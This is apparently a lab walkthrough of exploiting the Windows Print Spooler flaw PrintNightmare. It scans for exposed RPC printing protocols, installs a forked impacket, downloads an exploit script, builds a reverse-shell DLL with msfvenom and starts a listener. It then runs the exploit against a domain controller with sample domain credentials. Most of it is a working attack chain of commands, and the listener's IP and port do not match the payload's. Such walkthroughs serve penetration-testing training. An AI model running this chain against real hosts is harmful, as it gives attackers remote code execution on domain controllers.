## Scanning Vulnerable hosts with rpcdump.py

```powershell
# rpcdump.py @DC-IP | egrep 'MS-RPRN|MS-PAR'
$ rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
```

**_Expected Output :_**

```
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```


![](https://i.imgur.com/GkOuslZ.png)


### Preparation in Kali

Open a terminal and enter the following commands. This will get an alternate package of impacket and will download the python script needed for this exploit

```powershell
$ cd /opt/
$ sudo pip3 uninstall impacket
$ git clone https://github.com/cube0x0/impacket
$ cd impacket
$ sudo python3 ./setup.py install
$ sudo wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py

```


![exploit for the PrintNightmare](https://i.imgur.com/jCILEM9.png)


Now we are going to create the DLL that we will be using to create a reverse shell. Type in the following command and change the IP to your kali machine IP and copy the dll to the tmp directory


```powershell
$ sudo msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=192.168.0.157 LPORT=7777 -o reverse.dll
```




Next we will start a listener with `msfconsole`. Type in the following commands

```powershell
$ msfconsole
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/shell_reverse_tcp
msf6 > set LHOST 10.0.0.132
msf6 > set LPORT 443
msf6 > run
```

![exploit the PrintNightmare](https://www.thedutchhacker.com/wp-content/uploads/2021/07/image-3.png)

## Exploiting the PrintNightmare

Navigate to the tmp directory as that is where we have our `.py` file. Type in the following command to start the exploit. Please do change the **IP** address to your lab environment. 
**Note :** the first **IP** is the **Domain Controller-IP** and the second **IP** is the kali machine

```
sudo python3 CVE-2021-1675.py marvel.local/fcastle:Password1@192.168.0.149 '\\192.168.0.157\smb\reverse.dll'
```

![exploit the PrintNightmare](https://www.thedutchhacker.com/wp-content/uploads/2021/07/image-4-1024x876.png)

## Reference

- [CVE-2021-34527 – Security Update Guide – Microsoft – Windows Print Spooler Remote Code Execution Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [GitHub – cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527](https://github.com/cube0x0/CVE-2021-1675)